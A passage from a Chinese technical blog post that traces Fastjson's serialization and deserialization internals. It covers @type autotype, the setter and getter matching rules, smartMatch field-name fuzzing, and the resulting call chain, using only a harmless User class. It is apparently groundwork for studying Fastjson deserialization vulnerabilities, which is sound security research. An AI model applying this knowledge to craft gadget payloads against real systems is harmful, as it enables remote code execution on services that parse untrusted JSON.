class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getId() &#123;</span><br><span class="line">        System.out.println(&quot;getId&quot;);</span><br><span class="line">        return id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setId(int id) &#123;</span><br><span class="line">        System.out.println(&quot;setId&quot;);</span><br><span class="line">        this.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h6><p>调用 JSON 的 toJSONString 方法将对象转换为字符串：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import pojo.User;</span><br><span class="line"></span><br><span class="line">public class base &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User user = new User(&quot;zhangsan&quot;,1);</span><br><span class="line">        String json = JSON.toJSONString(user);</span><br><span class="line">        System.out.println(json);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240908181155911.png">
+
+<p>可以看出，在调用 JSON.toJSONString 方法时调用了对象的 getter 方法获取属性值。</p>
+<p>toJSONString 方法有很多重写：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240908182025834.png">
+
+<p>在 Java 中，方法参数后面的三个点（…）代表可变参数（Varargs），即这个方法可以接受任意数量的该类型参数。在 Fastjson 中，SerializerFeature… features 意味着这个方法可以接受多个 SerializerFeature 枚举值，甚至可以不传递任何 SerializerFeature。</p>
+<p>如果再多传入一个参数 SerializerFeature ，值为 SerializerFeature.WriteClassName ，就可以在序列化结果中多打印一个 <code>@type：类名 </code>：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240908182419256.png">
+
+<p>传入 SerializerFeature.WriteClassName 可以使得 Fastjson 支持自省，开启自省后序列化成 JSON 的数据就会多一个 @type ，这个是代表对象类型的 JSON 文本。</p>
+<h6 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h6><p>反序列化时常使用的方法为 parse() 、parseObject() 、parseArray() ，这三个方法也均包含若干重载方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240908183842566.png">
+
+<p>下面程序用来测试反序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import pojo.User;</span><br><span class="line"></span><br><span class="line">public class base2 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String json = &quot;&#123;\&quot;@type\&quot;:\&quot;pojo.User\&quot;,\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;zhangsan\&quot;&#125;&quot;;</span><br><span class="line">        String json2 = &quot;&#123;\&quot;id\&quot;:1,\&quot;name\&quot;:\&quot;zhangsan\&quot;&#125;&quot;;</span><br><span class="line">        System.out.println(JSON.parseObject(json));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parseObject(json2));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parseObject(json, User.class));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parseObject(json2, User.class));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parse(json));</span><br><span class="line">        System.out.println(&quot;----------------------------------&quot;);</span><br><span class="line">        System.out.println(JSON.parse(json2));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240908184736798.png">
+
+<p>不同的方法和参数得到的结果也不同，其中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(json2)</span><br><span class="line">JSON.parse(json2)</span><br></pre></td></tr></table></figure>
+
+<p>这两个方式的反序列化是失败的。</p>
+<h6 id="parse-、parseObject"><a href="#parse-、parseObject" class="headerlink" title="parse() 、parseObject()"></a>parse() 、parseObject()</h6><p>来聊聊这两个方法。在上面的案例中可以知道，如果要成功反序列化出 User 对象，parseObject 就一定要指定第二个参数为 User.class ，而 parse 则一定要用 @type 指定要反序列化的类。</p>
+<p>parseObject 方法如果不指定第二个参数，那么会返回 JSONObject 对象，而不是 User 对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(json)</span><br></pre></td></tr></table></figure>
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909201051828.png">
+
+<p>并且像这样的调用方式会同时调用 User 的 getter&#x2F;setter 方法。</p>
+<h3 id="getter-setter-方法的调用"><a href="#getter-setter-方法的调用" class="headerlink" title="getter&#x2F;setter 方法的调用"></a>getter&#x2F;setter 方法的调用</h3><p>可以发现，无论是序列化还是反序列化，都会调用其 getter 或 setter 方法。我们来跟进一下看看具体是在哪里调用的。</p>
+<p>就以 <code>JSON.parseObject(json)</code> 这样的调用方式为例，跟进 JSON#parseObject(String)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909202110606.png">
+
+<p>这里调用 parse 方法，跟进 JSON#parse(String)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909202301936.png">
+
+<p>继续跟进 JSON#parse(String, int)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909202358542.png">
+
+<p>这里先是调用 DefaultJSONParser 获取一个默认 Json 解析器，然后调用解析器的 parse 方法。</p>
+<p>跟进 DefaultJSONParser#parse()：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909202729863.png">
+
+<p>跟进 DefaultJSONParser#parse(Object)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909202826828.png">
+
+<p>直接进入了 case LBRACE 。JSONObject 的构造方法没什么可看的。</p>
+<p>直接跟进 DefaultJSONParser#parseObject(final Map, Object)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909203543875.png">
+
+<p>方法的中间调用了 config.getDeserializer 来获取一个反序列化器，我们先跟进它，也就是 ParserConfig#getDeserializer(Type)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909204441243.png">
+
+<p>这里调用重载方法，跟进 ParserConfig#getDeserializer(Class&lt;?&gt;, Type)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909205354076.png">
+
+<p>跟进 ParserConfig#createJavaBeanDeserializer(Class&lt;?&gt;, Type) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909205522033.png">
+
+<p>跟进 JavaBeanInfo#build(Class&lt;?&gt;, Type, PropertyNamingStrategy)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909210324655.png">
+
+<p>这个方法比较重要，那些 getter&#x2F;setter 方法就是在这里获取名称的。</p>
+<p>在方法的中间遍历类中的所有 public 方法，过滤出符合条件的 setter 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909215418147.png">
+
+<p>代码很长，这里就不放完了。总结起来就是：</p>
+<p><strong>判断 setter 方法：</strong></p>
+<ol>
+<li>方法名长度大于等于 4</li>
+<li>不是静态方法</li>
+<li>返回类型为空或当前类</li>
+<li>参数个数为 1 个</li>
+<li>方法上的 @JSONField 注解没有指定该字段不可反序列化</li>
+<li>方法名以 “set” 开头</li>
+</ol>
+<p><strong>判断字段名：</strong></p>
+<p><code>char c3 = methodName.charAt(3);</code> 获取方法名的第四个字符（即 setXyz 中的 X）</p>
+<ul>
+<li>如果 c3 是大写字母，则字段名为 setXyz 中的 xyz 。</li>
+<li>如果 c3 是下划线 _ ，则字段名为 set_xxx 中的 xxx 。</li>
+<li>如果方法名的第五个字符是大写字符，则保留原来的大写风格。比如 setURL 保留 URL 作为字段名。</li>
+<li>根据上述方法推导出来的字段名，通过反射去查找类中的实际字段。如果没有找到字段，并且方法参数是 <code>boolean</code> 类型，尝试将字段名前面加个 “is” ，改为 isXyz 形式重新查找字段。</li>
+</ul>
+<p>后面再接着遍历类中的所有 public 方法，过滤出符合条件的 getter 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240912125238245.png">
+
+<p><strong>同样总结一下获取 getter 方法的规则：</strong></p>
+<ul>
+<li>方法名长于 4</li>
+<li>不是静态方法</li>
+<li>以 get 开头且第 4 位是大写字母</li>
+<li>没有参数</li>
+<li>返回类型继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong </li>
+<li>对带有 @JSONField 注解的方法，优先使用注解中定义的属性名或选项。</li>
+</ul>
+<p>build 方法的最后将该类的构造函数、字段、获取到的 setter&#x2F;getter 方法以及其他与序列化和反序列化相关的信息都封装进了一个 JavaBeanInfo 对象：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909210450000.png">
+
+<p>好的，回到 DefaultJSONParser#parseObject(final Map, Object) ，我们接下来看下面的调用：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909222558930.png">
+
+<p>跟进 JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909222829590.png">
+
+<p>这里需要注意的是，如果直接进入下一步，会跟不进去：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909222955341.png">
+
+<p>这是由于 ParserConfig#createJavaBeanDeserializer(Class&lt;?&gt;, Type) 中设置 asmEnable 为 true 了。如果确实想跟进去看的话，可以在调试时将其值设置为 false 。asmEnable 是 true 的情况下，使用 asm 从字节码层面生成特定 javabean 的反序列化器，自然无法跟进去看了；为 false 的时候，则使用常规的 set 方法进行反序列化（效率低、不安全）。不过这两种方法生成的内容是一样的。</p>
+<p>那么重新调试，再次调试到这里的时候，将其值设置为 false ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909224200706.png">
+
+<p>继续调试到 JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object)，此时可以跟进了：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909224746559.png">
+
+<p>这里两个重载方法，一路跟到 JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object, Object, int)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909230114277.png">
+
+<p>这个方法在经过一系列处理后，最终调用到了 fieldDeser.setValue 来为 User 对象赋值。</p>
+<p>跟进 FieldDeserializer#setValue(Object, Object)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909230613785.png">
+
+<p>这里就是最终调用 setter 方法的地方。</p>
+<p>然而，如果说 json 字符串中的字段名与 JavaBeanInfo#build(Class&lt;?&gt;, Type, PropertyNamingStrategy) 方法获取到的 JavaBeanInfo 对象中存储的字段名不一致的话，那么 JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object, Object, int) 的 matchField 值为 false ，就会进入另一条分支，调用 parseField 方法来处理。比如我现在将 id 字段改为 <code>_i_d_</code> ，但是 setter 方法还是叫 setId ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240910113902176.png">
+
+<p>跟进 JavaBeanDeserializer#parseField(DefaultJSONParser, String, Object, Type, Map&lt;String, Object&gt;)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240910161435223.png">
+
+<p>跟进 JavaBeanDeserializer#smartMatch(String)，这是一个比较关键的方法，如果匹配不一致的话，会判断 key 是否是 is 开头，或者将 key 中的 - 和 _ 去掉再比对：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240910161832985.png">
+
+<p>也就是说即使字段名为 <code>_i_d_</code> ，依然能够找到名为 setId 的 setter 方法。</p>
+<p>若是走这条路，则是在 DefaultFieldDeserializer#parseField(DefaultJSONParser, Object, Type, Map&lt;String, Object&gt;) 中调用 setvalue 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240910170924261.png">
+
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240910171423585.png">
+
+<p>那么 getter 方法又在哪里调用呢？回到最初的 JSON#parseObject(String)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909230901546.png">
+
+<p>现在 parse 这条路已经走完了，跟进 JSON#toJSON(Object)，这是一个将 Java 对象转为 Json 数据的方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909231153735.png">
+
+<p>跟进 JSON#toJSON(Object, SerializeConfig) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909231640434.png">
+
+<p>这里调用 javaBeanSerializer.getFieldValuesMap 来获取字段值的 Map 集合。</p>
+<p>跟进 JavaBeanSerializer#getFieldValuesMap(Object)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909231809051.png">
+
+<p>这里调用 getter.getPropertyValue 获取属性值。</p>
+<p>跟进 FieldSerializer#getPropertyValue(Object) ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909231942642.png">
+
+<p>跟进 FieldInfo#get(Object)：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20240909232056519.png">
+
+<p>这里就是调用 getter 方法的地方了。</p>
+<h3 id="调用链总结"><a href="#调用链总结" class="headerlink" title="调用链总结"></a>调用链总结</h3><p>于是可以总结出如下调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">JSON#parseObject(String)</span><br><span class="line">*-&gt; JSON#parse(String)</span><br><span class="line">*   JSON#parse(String, int)</span><br><span class="line">*   DefaultJSONParser#parse()</span><br><span class="line">*   DefaultJSONParser#parse(Object)</span><br><span class="line">*   DefaultJSONParser#parseObject(final Map, Object)</span><br><span class="line">*   *-&gt; ParserConfig#getDeserializer(Type)</span><br><span class="line">*   *   ParserConfig#getDeserializer(Class&lt;?&gt;, Type)</span><br><span class="line">*   *   ParserConfig#createJavaBeanDeserializer(Class&lt;?&gt;, Type) # 设置 asmEnable 为 false</span><br><span class="line">*   *   JavaBeanInfo#build(Class&lt;?&gt;, Type, PropertyNamingStrategy) # 筛选 setter/getter 方法</span><br><span class="line">*   *-&gt; JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object)</span><br><span class="line">*   *   JavaBeanDeserializer#deserialze(DefaultJSONParser, Type, Object, int)</span><br><span class="line">*   *   